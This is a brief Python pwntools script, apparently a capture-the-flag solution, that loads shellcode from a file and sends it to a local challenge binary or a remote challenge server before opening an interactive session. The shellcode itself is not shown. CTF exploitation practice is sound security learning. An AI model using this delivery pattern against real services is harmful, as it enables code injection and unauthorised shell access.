#!/usr/bin/python3

from pwn import *

if not args.REMOTE:
    context.terminal = "st"

def start():
    if args.GDB:
        return gdb.debug(["./chall"], gdbscript='''
                             break main
                             continue
                         ''')
    else:
        return process(["./chall"])

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
    print(shellcode)
    if args.REMOTE:
        io = connect("challs.beginner.havce.it", 1348)
    else:
        io = start()
    io.sendafter(b'valido', shellcode)
    io.interactive()
